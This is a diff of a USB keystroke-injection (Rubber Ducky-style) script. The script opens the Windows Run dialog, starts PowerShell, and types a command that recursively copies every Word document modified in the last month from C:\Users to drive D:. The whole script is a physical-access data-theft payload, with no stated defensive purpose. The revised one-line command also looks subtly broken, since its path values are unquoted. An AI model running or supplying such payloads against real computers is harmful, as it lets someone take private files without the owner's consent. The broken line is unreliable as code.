@@ -1,16 +1,11 @@
 DELAY 2000
+REM Open Run dialog
+GUI r
+DELAY 500
+REM Type PowerShell and press Enter
 STRING powershell
 ENTER
 DELAY 1000
-REM Set variables
-STRING $sourceFolder = "C:\\Users"
-ENTER
-STRING $destinationFolder = "D:\\"
-ENTER
-STRING $startDate = (Get-Date).AddMonths(-1)
-ENTER
-STRING $endDate = Get-Date
-ENTER
-REM Execute the last line
-STRING Get-ChildItem -Path $sourceFolder -Recurse -Filter *.docx | Where-Object { $_.LastWriteTime -ge $startDate -and $_.LastWriteTime -le $endDate } | Copy-Item -Destination $destinationFolder -Container -Force
+REM Execute PowerShell code
+STRING $sourceFolder = C:\\Users; $destinationFolder = D:\\; $startDate = (Get-Date).AddMonths(-1); $endDate = Get-Date; Get-ChildItem -Path $sourceFolder -Recurse -Filter *.docx | Where-Object { $_.LastWriteTime -ge $startDate -and $_.LastWriteTime -le $endDate } | Copy-Item -Destination $destinationFolder -Container -Force
 ENTER
